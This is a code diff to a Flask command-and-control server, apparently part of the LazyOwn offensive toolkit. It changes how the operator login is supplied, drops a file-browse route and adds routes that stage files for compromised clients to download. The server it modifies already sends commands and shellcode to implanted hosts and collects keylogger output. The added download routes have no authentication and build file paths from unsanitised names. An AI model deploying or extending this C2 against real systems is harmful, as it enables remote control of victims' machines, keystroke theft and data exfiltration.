@@ -8,17 +8,18 @@ import threading
 from functools import wraps
 from dnslib.dns import RR, QTYPE, TXT
 from dnslib.server import DNSServer, DNSLogger
-from flask import Flask, request, render_template, redirect, url_for, jsonify, Response
+from flask import Flask, request, render_template, redirect, url_for, jsonify, Response, send_from_directory
 
-USERNAME = 'LazyOwn'
-PASSWORD = 'LazyOwn'
+
 BASE_DIR = os.path.abspath("../sessions")  
 
-if len(sys.argv) > 1:
+if len(sys.argv) > 3:
     lport = sys.argv[1]
+    USERNAME = sys.argv[2]
+    PASSWORD = sys.argv[3]
     print(f"    [!] Launch C2 at: {lport}")
 else:
-    print("    [!] Need pass the port as argument")
+    print("    [!] Need pass the port, user & pass as argument")
     sys.exit(2)
 
 app = Flask(__name__)
@@ -73,35 +74,6 @@ def index():
     return render_template('index.html', connected_clients=connected_clients, results=results)
 
 
-@app.route('/browse', methods=['GET'])
-def browse_files():
-    subdir = request.args.get('dir', '')
-    current_path = os.path.abspath(os.path.join(BASE_DIR, subdir))
-
-    
-    if not current_path.startswith(BASE_DIR):
-        return "Access to this directory is not allowed", 403
-
-    
-    if not os.path.exists(current_path) or not os.path.isdir(current_path):
-        return "Directory does not exist", 404
-
-
-        
-    entries = []
-    for entry in os.listdir(current_path):
-        entry_path = os.path.join(current_path, entry)
-        entries.append({
-            "name": entry,
-            "is_directory": os.path.isdir(entry_path),
-            "path": os.path.join(subdir, entry) if subdir else entry
-        })
-
-    
-    return render_template('browse.html', current_path=current_path, entries=entries, parent=subdir.rsplit('/', 1)[0] if '/' in subdir else '')
-
-
-
 @app.route('/xss', methods=['GET'])
 def xss():
     params = request.args
@@ -150,6 +122,7 @@ def receive_result(client_id):
 def issue_command():
     client_id = request.form['client_id']
     command = request.form['command']
+    print(command)
     commands[client_id] = command
     return redirect(url_for('index'))
 
@@ -219,13 +192,47 @@ def keylogger(client_id):
         print(f"[ERROR] Error procesando logs de {client_id}: {str(e)}")
         return jsonify({"status": "error", "message": "Internal server error"}), 500
 
+@app.route('/download_file', methods=['POST'])
+def download_file():
+    client_id = request.form['client_id']
+    file = request.files['file']
+    if file:
+        temp_dir = os.path.join(os.getcwd(), 'temp_uploads')
+        os.makedirs(temp_dir, exist_ok=True)
+        file_path = os.path.join(temp_dir, file.filename)
+        file.save(file_path)
+        commands[client_id] = f"download:{file.filename}"
+
+        return redirect(url_for('index'))
+    else:
+        return jsonify({"status": "error", "message": "No file selected"}), 400
+
+@app.route('/download/<path:file_path>', methods=['GET'])
+def serve_file(file_path):
+    temp_dir = os.path.join(os.getcwd(), 'temp_uploads')
+    full_file_path = os.path.join(temp_dir, file_path)
+    if os.path.exists(full_file_path):
+        try:
+            file_name = os.path.basename(file_path)
+            return send_from_directory(temp_dir, file_name, as_attachment=True)
+        except Exception as e:
+            return str(e), 500
+    else:
+        return jsonify({"status": "error", "message": "File not found"}), 404
+
+
 @app.route('/run_shellcode', methods=['POST'])
 @requires_auth
 def run_shellcode():
     client_id = request.form['client_id']
     shellcode = request.form['shellcode']
-    commands[client_id] = f"shellcode:{shellcode}"
+    commands[client_id] = f"sc:{shellcode}"
     return redirect(url_for('index'))
+
+@app.route('/get_results', methods=['GET'])
+@requires_auth
+def get_results():
+    return jsonify(results)
 
 @app.route('/start_bridge', methods=['POST'])
 @requires_auth
